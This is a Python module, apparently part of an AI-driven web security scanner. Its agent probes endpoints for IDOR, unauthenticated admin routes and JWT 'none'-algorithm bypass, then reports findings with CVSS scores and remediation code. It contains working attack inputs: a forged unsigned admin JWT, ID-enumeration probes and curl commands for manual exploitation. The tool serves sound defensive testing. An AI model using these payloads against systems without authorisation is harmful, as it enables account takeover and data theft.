"""
Wave 3: Authentication & Access Control Specialist Agent.
Probes for IDOR (Broken Object Level Authorization), JWT tampering,
and unauthenticated administrative route access.
"""

from typing import List, Dict, Any, Optional
import httpx
from agents.base_agent import BaseAgent
from core.schemas import ServiceEndpoint, VulnerabilityFinding, ConfidenceLevel, TargetScope
from core.evidence_vault import EvidenceVault
from core.llm_brain import AIBrain
from core.cvss_engine import CVSSEngine


class AuthSecAgent(BaseAgent):
    """Specialist agent targeting Authentication and Authorization flaws (OWASP A01 / A07)."""

    def __init__(
        self,
        scope: TargetScope,
        vault: EvidenceVault,
        brain: AIBrain,
        transport: Optional[httpx.AsyncBaseTransport] = None
    ):
        super().__init__("AuthSecAgent", scope, vault, brain, transport=transport)

    async def execute(self, endpoints: List[ServiceEndpoint]) -> List[VulnerabilityFinding]:
        findings: List[VulnerabilityFinding] = []

        async with self.get_client(timeout=5.0) as client:
            for ep in endpoints:
                if ep.surface_category == "STATIC":
                    continue

                ep.tested_by_agents.append(self.name)

                # Test 1: IDOR / Broken Object-Level Authorization
                # If path or query contains numeric IDs (e.g. /api/users/1 or ?id=1 or ?user_id=2)
                if any(k in ep.url.lower() for k in ["/user/", "/profile/", "/account/", "/order/", "/invoice/"]) or any(p in ["id", "user_id", "account_id"] for p in ep.parameters):
                    # Fetch baseline to verify if endpoint ignores ID or dynamically returns entity records
                    baseline_res = await self._send_request(client, "GET", ep.url)
                    baseline_len = len(baseline_res.text.strip()) if baseline_res else 0

                    # Probe adjacent IDs
                    for test_id in ["1", "2", "100", "0", "999"]:
                        probe_url = ep.url
                        probe_params = None
                        if "{" in probe_url or any(ch.isdigit() for ch in probe_url.split("/")):
                            # Path param replacement
                            parts = probe_url.split("/")
                            for idx, pt in enumerate(parts):
                                if pt.isdigit():
                                    parts[idx] = test_id
                            probe_url = "/".join(parts)
                        else:
                            probe_params = {"id": test_id, "user_id": test_id}

                        res = await self._send_request(client, "GET", probe_url, params=probe_params)
                        if res is not None and res.status_code == 200:
                            # Reject if response is identical to baseline without query param (parameter ignored)
                            if baseline_len > 0 and abs(len(res.text.strip()) - baseline_len) < 5 and not res.headers.get("content-type", "").startswith("application/json"):
                                continue

                            # Reject if response is an unhydrated SPA shell catch-all
                            is_spa_catch_all = any(marker in res.text.lower() for marker in [
                                "create-react-app", "<div id=\"root\"", "<div id=\"app\"",
                                "content=\"web site created using create-react-app\""
                            ])
                            if is_spa_catch_all:
                                continue

                            analysis = self.brain.analyze_vulnerability_hypothesis(
                                probe_url, "id", test_id, res.status_code, res.text, "IDOR"
                            )
                            if analysis["is_vulnerable"]:
                                evidence = self.record_finding_evidence(
                                    method="GET",
                                    url=probe_url,
                                    status_code=res.status_code,
                                    payload=f"IDOR Object Probe: {test_id}",
                                    response_body=res.text[:1000]
                                )
                                cvss = CVSSEngine.get_template_metrics("idor")
                                finding = VulnerabilityFinding(
                                    finding_id=f"VULN-IDOR-{len(findings)+1:03d}",
                                    title=f"Insecure Direct Object Reference (IDOR) on {ep.url}",
                                    severity=cvss.severity,
                                    category="BROKEN_ACCESS_CONTROL",
                                    owasp_top10="A01:2021-Broken Access Control",
                                    cwe_id="CWE-639",
                                    affected_url=probe_url,
                                    http_method="GET",
                                    affected_parameter="id",
                                    cvss=cvss,
                                    confidence=ConfidenceLevel.CERTAIN,
                                    description="Sensitive record object identifier is controllable without server-side tenant or session ownership verification.",
                                    plain_english_summary="The application checks that you are logged in, but fails to check whether you actually own the specific account or file you are trying to view. It is like checking someone's ID at an apartment building entrance, but letting them open any resident's apartment door just by turning the handle.",
                                    where_is_the_flaw=f"Endpoint 'GET {probe_url}' at record identifier '{test_id}'. The backend queries database rows directly by the client-provided ID without verifying if the record belongs to the active authenticated session.",
                                    how_attacker_exploits="1. Attacker logs into their own legitimate account (e.g. ID 101).\n2. They increment the ID in the request to 102, 103, etc.\n3. The backend returns other users' private profiles, invoices, personal documents, and order histories.",
                                    real_world_impact="Mass Data Harvesting & Privacy Breach: Attackers can sequentially crawl IDs to download confidential records, customer PII, or internal tenant files.",
                                    reproduction_steps=[
                                        f"Issue GET request referencing foreign entity ID '{test_id}'",
                                        "Observe full data payload returned without session authorization check"
                                    ],
                                    kali_manual_verification=f"""# Step 1: In Kali Linux Terminal, execute baseline request for primary entity:
curl -s -i -X GET '{probe_url}' > /tmp/user_orig.json

# Step 2: Query adjacent entity ID without session authorization:
curl -s -i -X GET '{probe_url}?id={test_id}' > /tmp/user_target.json

# Step 3: Compare outputs to confirm unauthorized foreign profile access:
diff -u /tmp/user_orig.json /tmp/user_target.json
# Confirm response status is 200 OK and returns PII belonging to another tenant/user.""",
                                    evidence=evidence,
                                    remediation_advice="Enforce row-level ownership checks based on the authenticated session identity rather than client-supplied entity identifiers.",
                                    remediation_code_sample="""# Secure Implementation (Tenant Ownership Check):
user_record = db.query(User).filter(User.id == target_id, User.tenant_id == current_user.tenant_id).first()
if not user_record:
    raise HTTPException(status_code=403, detail="Access denied")""",
                                    discovered_by_agent=self.name,
                                    verified_by_gate=False
                                )
                                findings.append(finding)
                                ep.tested_vectors.append("IDOR")
                                break

                # Test 2: Unauthenticated Admin Route Access (Missing Function Level Access Control)
                if ep.surface_category == "ADMIN" or "admin" in ep.url.lower():
                    # Request without credentials
                    res = await self._send_request(client, ep.method, ep.url, headers={"Authorization": ""})
                    if res is not None and res.status_code == 200:
                        lower_txt = res.text.lower()
                        # Reject false positives:
                        # 1. Login page or authentication prompt without admin data
                        is_login_page = any(k in lower_txt for k in ['type="password"', "type='password'", "sign in", "login", "please log in", "authenticate"])
                        
                        # 2. Generic HTML / React SPA catch-all
                        is_spa_shell = any(k in lower_txt for k in ["create-react-app", "<div id=\"root\"", "<div id=\"app\"", "content=\"web site created"])

                        admin_indicators = [
                            "jwt_signing_key", "admin_config", "system_env", "user_management", "admin console",
                            "cluster_topology", "debug_mode", "database_backend", "superadmin", "site administration",
                            "admin panel", "administrator", "control panel", "audit logs", "system configuration",
                            "manage roles", "admin portal", "cluster status", "active sessions", "manage users",
                            "\"is_admin\": true", "\"role\": \"admin\"", "\"is_superuser\": true", "server status: active"
                        ]
                        has_admin_content = any(k in lower_txt for k in admin_indicators)

                        if is_login_page or is_spa_shell or not has_admin_content:
                            continue

                        evidence = self.record_finding_evidence(
                            method=ep.method,
                            url=ep.url,
                            status_code=res.status_code,
                            payload="No Auth Header Probe",
                            response_body=res.text[:1000]
                        )
                        cvss = CVSSEngine.get_template_metrics("auth")
                        finding = VulnerabilityFinding(
                            finding_id=f"VULN-ADMIN-{len(findings)+1:03d}",
                            title=f"Unauthenticated Access to Administrative Endpoint: {ep.url}",
                            severity=cvss.severity,
                            category="BROKEN_ACCESS_CONTROL",
                            owasp_top10="A01:2021-Broken Access Control",
                            cwe_id="CWE-306",
                            affected_url=ep.url,
                            http_method=ep.method,
                            affected_parameter=None,
                            cvss=cvss,
                            confidence=ConfidenceLevel.CERTAIN,
                            description="Privileged administrative endpoint is accessible anonymously without authentication or RBAC validation.",
                            plain_english_summary="The admin control panel has no lock on the front door. Anyone who knows or guesses the URL can enter and use management functions without entering any password or logging in.",
                            where_is_the_flaw=f"Endpoint '{ep.method} {ep.url}'. The route handler lacks authentication and role-based access control (RBAC) middleware, allowing open anonymous internet traffic to reach management functions.",
                            how_attacker_exploits="1. Attacker discovers the admin endpoint via directory brute-forcing or automated scanning.\n2. Attacker sends a direct request without any authorization headers.\n3. The application grants unrestricted access to privileged operations, user lists, and internal system configs.",
                            real_world_impact="Full Administrative Compromise: Unauthorized management of users, backend configurations, system status, and internal operational data.",
                            reproduction_steps=[
                                f"Send {ep.method} request directly to {ep.url} with zero credentials",
                                "Verify administrative operations or internal configurations are exposed"
                            ],
                            kali_manual_verification=f"""# Step 1: In Kali Linux Terminal, send unauthenticated GET request to admin route:
curl -v -s -i -X {ep.method} '{ep.url}'

# Step 2: Verify HTTP response status and body:
# - Status must be 200 OK (not 401 Unauthorized or 403 Forbidden)
# - Response contains administrative operations, cluster configs, or user management data
# - Confirm it is not a redirect to login (/login or 302)""",
                            evidence=evidence,
                            remediation_advice="Enforce role-based access control (RBAC) middleware on all administrative route groups.",
                            remediation_code_sample="""# Secure Middleware:
@app.middleware("http")
async def require_admin_role(request: Request, call_next):
    if request.url.path.startswith("/admin") and request.state.user.role != "ADMIN":
        return Response(status_code=403)
    return await call_next(request)""",
                            discovered_by_agent=self.name,
                            verified_by_gate=False
                        )
                        findings.append(finding)
                        ep.tested_vectors.append("AUTH_BYPASS")

                # Test 3: JWT 'none' Algorithm / Insecure Token Handling
                if ep.surface_category == "AUTH" or "token" in ep.url.lower():
                    # Probe with unsigned JWT 'none' header: {"alg": "none", "typ": "JWT"}.{"user": "admin", "role": "admin"}.
                    # eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
                    none_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
                    res = await self._send_request(
                        client,
                        ep.method,
                        ep.url,
                        headers={"Authorization": f"Bearer {none_jwt}"}
                    )
                    if res is not None and res.status_code == 200:
                        # Reject if the response is an HTML page (like SPA catch-all) or login page
                        if "<!doctype html" in res.text.lower() or "login" in res.text.lower():
                            continue
                        # Verify baseline without auth header to ensure token actually unlocked privileged data
                        baseline_res = await self._send_request(client, ep.method, ep.url)
                        if baseline_res is not None and baseline_res.text.strip() == res.text.strip():
                            continue

                        lower_jwt_resp = res.text.lower()
                        auth_success = any(tok in lower_jwt_resp for tok in [
                            "admin", "welcome", "authenticated", "\"role\": \"admin\"",
                            "\"status\": \"authenticated\"", "\"logged_in\": true", "\"access\": \"granted\""
                        ])
                        if not auth_success:
                            continue

                        evidence = self.record_finding_evidence(
                            method=ep.method,
                            url=ep.url,
                            status_code=res.status_code,
                            payload=f"Bearer {none_jwt}",
                            response_body=res.text[:1000]
                        )
                        cvss = CVSSEngine.get_template_metrics("jwt")
                        finding = VulnerabilityFinding(
                            finding_id=f"VULN-JWT-{len(findings)+1:03d}",
                            title="JWT Algorithm 'none' Signature Bypass",
                            severity=cvss.severity,
                            category="BROKEN_AUTH",
                            owasp_top10="A07:2021-Identification and Authentication Failures",
                            cwe_id="CWE-347",
                            affected_url=ep.url,
                            http_method=ep.method,
                            affected_parameter="Authorization Header",
                            cvss=cvss,
                            confidence=ConfidenceLevel.CERTAIN,
                            description="The authentication service accepts unsigned JWTs having the algorithm header specified as 'none', allowing arbitrary identity spoofing.",
                            plain_english_summary="When you log in, the server gives you a digital badge (JWT) sealed with an encryption key. But the server is configured to accept badges that claim 'no seal needed' ('alg: none'). Anyone can fabricate a fake badge claiming to be the root administrator, and the server blindly trusts it.",
                            where_is_the_flaw=f"Endpoint '{ep.method} {ep.url}' at Authorization Header. The JWT signature validation library permits tokens signed with algorithm 'none', skipping cryptographic verification entirely.",
                            how_attacker_exploits="1. Attacker crafts a standard JWT payload containing '{ \"user\": \"admin\", \"role\": \"admin\" }'.\n2. Sets the header algorithm to 'none' and drops the signature suffix.\n3. Attacker submits the forged token in the Authorization header.\n4. Server accepts the token as valid and grants full administrative privileges.",
                            real_world_impact="Total Identity Forgery & Privilege Escalation: Any anonymous user can impersonate any user or admin without knowing cryptographic secret keys.",
                            reproduction_steps=[
                                "Forge JWT token with alg: 'none' and role: 'admin'",
                                "Send request with forged token in Authorization header",
                                "Verify elevated administrative permissions granted without secret key"
                            ],
                            kali_manual_verification=f"""# Step 1: In Kali Linux Terminal, generate unsigned JWT header and payload:
# Header: echo -n '{{"alg":"none","typ":"JWT"}}' | base64 | tr -d '=' | tr '/+' '_-'
# Payload: echo -n '{{"user":"admin","role":"admin"}}' | base64 | tr -d '=' | tr '/+' '_-'
# Full Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

# Step 2: Submit forged token in Authorization header:
curl -v -s -i -X {ep.method} '{ep.url}' \\
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."

# Step 3: Verify elevated administrative access granted without cryptographic signature check.""",
                            evidence=evidence,
                            remediation_advice="Explicitly whitelist accepted cryptographic algorithms (e.g. ['RS256', 'HS256']) and explicitly reject 'none'.",
                            remediation_code_sample="""# Secure Implementation (PyJWT):
jwt.decode(token, SECRET_KEY, algorithms=["HS256"]) # strictly prohibit "none" """,
                            discovered_by_agent=self.name,
                            verified_by_gate=False
                        )
                        findings.append(finding)
                        ep.tested_vectors.append("JWT_NONE")

        return findings
